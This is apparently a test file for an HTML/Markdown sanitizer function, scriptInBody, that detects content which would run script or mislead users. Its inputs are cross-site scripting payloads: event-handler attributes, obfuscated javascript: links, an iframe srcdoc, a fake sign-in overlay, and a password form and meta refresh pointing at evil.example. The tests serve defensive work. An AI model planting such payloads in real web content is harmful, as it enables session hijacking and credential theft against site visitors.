import { describe, expect, test } from 'bun:test'
import { scriptInBody } from '../src/unsafe'

describe('scriptInBody', () => {
  test('finds what would run as the site, however the browser tokenizes it', async () => {
    for (const [body, found] of [
      ['Hi <script>alert(1)</script>', 'a <script> tag'],
      ['<script/x>alert(1)</script>', 'a <script> tag'],
      ['<img src="x>" onerror=alert(1)>', 'the attribute onerror'],
      ['a <img alt=">" src=x onerror=alert(1)> b', 'the attribute onerror'],
      ['a <img alt="<" src=x onerror=alert(1)> b', 'the attribute onerror'],
      ['<div/onclick=alert(1)>x', 'the attribute onclick'],
      ['<div>\n<svg/onload=alert(1)>\n</div>', 'a <svg> tag'],
      ['<div>\n<img/src=x onerror=alert(1)>\n</div>', 'the attribute onerror'],
      ['<DIV ONMOUSEOVER="alert(1)">x</DIV>', 'the attribute onmouseover'],
      ['[link](javascript:alert(1))', 'a href running script'],
      ['<a href="&#106;avascript:alert(1)">x</a>', 'a href running script'],
      ['<a href="java\tscript:alert(1)">x</a>', 'a href running script'],
      ['<iframe srcdoc="<script>alert(1)</script>"></iframe>', 'a <iframe> tag'],
      ['<div style="position:fixed;inset:0">fake sign-in</div>', 'the attribute style'],
      ['<form action="https://evil.example"><input name="password"></form>', 'a <form> tag'],
      ['<meta http-equiv="refresh" content="0;url=https://evil.example">', 'a <meta> tag'],
    ] as const)
      expect(await scriptInBody(body, []), body).toBe(found)
  })

  test('keeps Markdown, safe HTML, code showing HTML and the collection\'s own components', async () => {
    for (const body of [
      '# Title\n\nSome **bold** text, a [link](https://example.com) and ![a pixel](data:image/png;base64,iVBORw0KGgo=).',
      '```html\n<script>shown, not run</script>\n```',
      'Inline `<img onerror=x>` code.',
      '<kbd>Ctrl</kbd> and <abbr title="HyperText">HTML</abbr>',
      '- [ ] to do\n- [x] done',
      '<Callout once title="Note">Text</Callout>',
      '<Link href="/a" />',
    ])
      expect(await scriptInBody(body, ['Callout', 'Link']), body).toBeUndefined()
  })

  test('still finds script inside a component, or in a tag only named like one', async () => {
    expect(await scriptInBody('<Callout title="a"><script>alert(1)</script></Callout>', ['Callout'])).toBe('a <script> tag')
    expect(await scriptInBody('<Calloutx onclick="alert(1)">x</Calloutx>', ['Callout'])).toBe('the attribute onclick')
  })
})
